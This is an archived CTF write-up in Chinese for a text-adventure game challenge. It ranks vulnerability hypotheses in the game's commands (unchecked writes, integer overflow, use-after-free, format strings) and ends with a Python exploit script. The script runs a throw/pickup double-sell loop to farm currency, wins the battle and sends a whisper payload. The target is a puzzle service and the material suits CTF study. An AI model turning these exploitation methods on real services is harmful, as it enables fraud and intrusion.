# 知识点

Challenges

# 题目分析

分类：Misc / Challenges。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [ANALYSIS.md](ANALYSIS.md)
- [ANALYSIS2.md](ANALYSIS2.md)
- [agent.py](agent.py)
- [analyze.py](analyze.py)
- [bad_puppet.zip](bad_puppet.zip)
- [brutesize.py](brutesize.py)
- [burst.py](burst.py)
- [c.py](c.py)
- [cli.py](cli.py)
- [cycle.py](cycle.py)
- [decouple.py](decouple.py)
- [decouple2.py](decouple2.py)
- [diag.py](diag.py)
- [diag2.py](diag2.py)
- [diag3.py](diag3.py)
- [dup.py](dup.py)
- [exp_logic.py](exp_logic.py)
- [exp_whisper.py](exp_whisper.py)
- [exploit.py](exploit.py)
- [explore1.py](explore1.py)
- [finalwin.py](finalwin.py)
- [fullchain.py](fullchain.py)
- [fullchain2.py](fullchain2.py)
- [fullchain3.py](fullchain3.py)
- [funcs.txt](funcs.txt)
- [game.py](game.py)
- [hunter.py](hunter.py)
- [leak_then_conf.py](leak_then_conf.py)
- [leakdev.py](leakdev.py)
- [leaklibc.py](leaklibc.py)
- [localchain.py](localchain.py)
- [localchain2.py](localchain2.py)
- [localrun.py](localrun.py)
- [mega.py](mega.py)
- [mega.txt](mega.txt)
- [mega2.txt](mega2.txt)
- [poison_test.py](poison_test.py)
- [probe.py](probe.py)
- [race.py](race.py)
- [race2.py](race2.py)
- [recon2.txt](recon2.txt)
- [run.py](run.py)
- [rwtest.py](rwtest.py)
- [rwtest2.py](rwtest2.py)
- [scan.py](scan.py)
- [scan2.py](scan2.py)
- [scan3.py](scan3.py)
- [selfwrite.py](selfwrite.py)
- [short_then_long.py](short_then_long.py)
- [stage1_leak.py](stage1_leak.py)
- [tryhit.py](tryhit.py)
- [two_whisper.py](two_whisper.py)
- [typeconf.py](typeconf.py)
- [vm_session.py](vm_session.py)
- [win.py](win.py)
- [winremote.py](winremote.py)

## 已有分析

- [ANALYSIS.md](ANALYSIS.md)
- [ANALYSIS2.md](ANALYSIS2.md)

### 剑士 Hero / 至尊魔戒 / 海拉鲁 —— 黑盒静态推理作战计划

> 无附件、无源码，纯黑盒。所有命令未对目标执行。脚本：`probe.py` / `exp_whisper.py` / `exp_logic.py`

#### 0. 状态机基线（从题目给的输出反推）

| 字段 | 值 | 推断 |
|---|---|---|
| `Main World Hero` vs `Inventory Puppet Hero` | 两个标题 | **两个对象视图**：世界对象 + 傀儡/镜像背包。uaf/结构体覆盖的高危信号 |
| `Equipped: empty` 但 `inv list` 里 `equipped=0` | 0/1 布尔 | `inv equip` 必须先做，`mw whisper` 只吃"已装备"物品 |
| `HP=100 Stamina=100 Rupees=1000 Arrows=10 BossHP=0` | 一排标量 | hero 结构体字段布局大概率就是这个顺序 |
| `EXP=0 Battle=inactive Turn=0` | 第 3 行 | 战斗状态机独立；`Turn` 是回合计 |
| `shop list`: 10000/stock=1 Master Sword | 唯一高价品 | 明确目标物 |
| `Bomb Flower price=64 stock=999` | 可堆叠消耗品 | `use item` 的战斗资源 |
| `enemy_hp=400/400` vs `player_hp=100` | 4 倍血差 | 树枝打不动 → 必须搞武器或搞数值 |

#### 1. 假设排序

| # | 假设 | 概率 | 一句话 |
|---|---|---|---|
| H1 | `mw whisper` 无长度校验，越界写进 item 结构体 / hero 结构体（Rupees/HP/BossHP 直接可控） | 55% | "whisper=低语"就是给你一个**任意字节写**，最终靠改游戏状态拿 flag，不需要 ROP |
| H2 | `shop buy <idx> <qty>` 数量负数 / `price*qty` int32 溢出 → 卢比暴涨 | 25% | 最符合"中文 misc 文本游戏"的经典题面 |
| H3 | `mw throw` / `mw pickup` / `inv drop` 生命周期错乱：UAF、double free、负索引 OOB | 12% | "Puppet" 这个词就是提示 |
| H4 | `desc` 被 `printf(desc)` 直接当格式串 → `%n` 任意写 | 6% | 依赖 H1 的写原语才能注入 `%n` |
| H5 | 杂项：`map teleport castle` 无门禁、`inv sort` 比较器、stock 负数、flee 刷 EXP | 2% | 顺手验证，成本极低 |

**题型判断**：`misc（逻辑）+ 结构体字段覆盖的盲打 pwn-lite`。不是栈溢出/ROP 题——题面没有任何二进制交互痕迹，所有输出都是 `[*]` 风格的结构化状态，天然是"状态可观测"的盲打环境。

#### 2. 验证阶梯（先无损 → 后破坏，破坏性探针一条连接一次）

见 `probe.py`：
- `python3 probe.py recon`：help / mw show / inv list / shop list / map show + 重连看**状态是否跨连接持久**
- `python3 probe.py hierarchy`：`help mw` / `help shop` / `mw` / `battle help` → 挖隐藏子命令（`use item` 是不是顶格命令）
- `python3 probe.py edges`：26 条边界探针，每条独立连接

H1 验证：`python3 exp_whisper.py ramp`（斜坡 payload，byte[i]=i&0xff，被踩的字段打印成十进制后能反推偏移）。
H2 验证：`python3 exp_logic.py money`。
H3 验证：手动序列 `inv equip 0` → `mw throw 0` → `inv list`（puppet 是否还显示树枝 = UAF 铁证）→ `shop buy 3 1` → `inv list`（是否类型混淆成 Bomb Flower）。

#### 3. mw 原语盲打（H1/H3）

- Phase A 建模：斜坡 payload 扫长度 → 找字段边界
- Phase B 塑形：`mw throw` + `shop buy` 回收同尺寸 chunk；抛两次看 double free；买两件看是否同 chunk（改 A 看 B）
- Phase C 提权：改 price → 卖；改 type → 当武器；改 Rupees/HP/BossHP → 直接赢
- Phase D 拿 flag：改完状态 → `map teleport castle` → `battle` → 秒杀 → flag

#### 4. 纯逻辑速通（H2）

`exp_logic.py`：卢比阶梯 → 买/装备 Master Sword → teleport castle → 自适应回合。
数值预算公式：`need = ceil(enemy_hp / D)`；可行条件 `(need-1)*E < player_hp`；不满足就插 `use item`。

#### 5. 连上必抓清单

见正文表格（风险等级 = 会不会毁掉本次会话状态）。


# EXP

- [agent.py](agent.py)
- [analyze.py](analyze.py)
- [brutesize.py](brutesize.py)
- [burst.py](burst.py)
- [c.py](c.py)
- [cli.py](cli.py)
- [cycle.py](cycle.py)
- [decouple.py](decouple.py)
- [decouple2.py](decouple2.py)
- [diag.py](diag.py)
- [diag2.py](diag2.py)
- [diag3.py](diag3.py)
- [dup.py](dup.py)
- [exp_logic.py](exp_logic.py)
- [exp_whisper.py](exp_whisper.py)
- [exploit.py](exploit.py)
- [explore1.py](explore1.py)
- [finalwin.py](finalwin.py)
- [fullchain.py](fullchain.py)
- [fullchain2.py](fullchain2.py)
- [fullchain3.py](fullchain3.py)
- [game.py](game.py)
- [hunter.py](hunter.py)
- [leak_then_conf.py](leak_then_conf.py)
- [leakdev.py](leakdev.py)
- [leaklibc.py](leaklibc.py)
- [localchain.py](localchain.py)
- [localchain2.py](localchain2.py)
- [localrun.py](localrun.py)
- [mega.py](mega.py)
- [poison_test.py](poison_test.py)
- [probe.py](probe.py)
- [race.py](race.py)
- [race2.py](race2.py)
- [run.py](run.py)
- [rwtest.py](rwtest.py)
- [rwtest2.py](rwtest2.py)
- [scan.py](scan.py)
- [scan2.py](scan2.py)
- [scan3.py](scan3.py)
- [selfwrite.py](selfwrite.py)
- [short_then_long.py](short_then_long.py)
- [stage1_leak.py](stage1_leak.py)
- [tryhit.py](tryhit.py)
- [two_whisper.py](two_whisper.py)
- [typeconf.py](typeconf.py)
- [vm_session.py](vm_session.py)
- [win.py](win.py)
- [winremote.py](winremote.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
#!/usr/bin/env python3
"""Full game exploit: double-sell money farm -> bombs -> Ganon -> Ring -> whisper."""
import socket, time, sys, re, os

HOST = os.environ.get("EH", "127.0.0.1")
PORT = int(os.environ.get("EP", "31337"))

class G:
    def __init__(self, s):
        self.s = s
        self.buf = b""
    def recv_until(self, pats, timeout=2.0):
        if isinstance(pats, str): pats=[pats]
        end = time.time()+timeout
        out = b""
        while time.time() < end:
            self.s.settimeout(max(0.02, end-time.time()))
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                break
            except Exception:
                break
            if not d:
                out += b"<EOF>"; break
            out += d
            t = out.decode("utf-8","replace")
            if any(p in t for p in pats): break
        self.buf += out
        return out.decode("utf-8","replace")
    def cmd(self, c, wait=None, timeout=2.0):
        try:
            self.s.sendall(c.encode()+b"\n")
        except Exception as e:
            print("[send err]", e); raise
        time.sleep(0.03)
        out = self.recv_until(wait or [""], timeout)
        print(">>> %s\n%s" % (c, out.rstrip()), flush=True)
        if "<EOF>" in out: raise RuntimeError("server closed")
        return out

def connect():
    s = socket.socket(); s.settimeout(3); s.connect((HOST, PORT))
    g = G(s)
    g.recv_until("Great Plateau", 3)
    return g

def main():
    g = connect()
    cycles = int(sys.argv[1]) if len(sys.argv)>1 else 13
    # initial buy+equip
    g.cmd("shop buy 0 1", ["tx: item added", "not enough"])
    g.cmd("inv equip 1", ["tx: main world equipped", "invalid"])
    for i in range(cycles):
        g.cmd("shop sell 1", ["shop sold", "invalid"])
        g.cmd("mw throw 0", ["throws equipped item", "invalid"])
        g.cmd("mw pickup 0", ["tx: item added", "invalid"])
        g.cmd("shop sell 1", ["shop sold", "invalid"])
        g.cmd("shop buy 0 1", ["tx: item added", "not enough"])
        g.cmd("inv equip 1", ["tx: main world equipped", "invalid"])
        time.sleep(0.4)
        st = g.cmd("mw show", ["Drops:"])
        m = re.search(r"Rupees=(\d+)", st)
        print("[cycle %d rupees] %s" % (i, m.group(1) if m else "?"), flush=True)
    st = g.cmd("mw show", ["Drops:"])
    r = int(re.search(r"Rupees=(\d+)", st).group(1))
    bombs = min(999, (r-500)//64)
    print("[bombs to buy] %d with %d rupees" % (bombs, r), flush=True)
    g.cmd("shop buy 3 %d" % bombs, ["tx:", "not enough"])
    g.cmd("inv list", ["Inventory"])
    g.cmd("map teleport castle", ["Encounter"])
    g.cmd("battle", ["player turn", "already"])
    # two-step use item
    g.cmd("use item", ["Enter inventory idx"])
    g.cmd("1", ["Enter quantity"])
    g.cmd("%d" % bombs, ["Battle won", "damage"])
    g.cmd("mw show", ["Drops:"])
    g.cmd("mw pickup 0", ["tx: item added", "invalid"])
    g.cmd("inv list", ["Inventory"])
    g.cmd("inv equip 1", ["tx: main world equipped", "invalid"])
    g.cmd("mw show", ["Drops:"])
    g.cmd("mw whisper 0 4142434445464748", ["whispered", "only"])
    g.cmd("mw show", ["Drops:"])
    g.cmd("quit", ["bye"], 1.0)

if __name__ == "__main__":
    main()
```
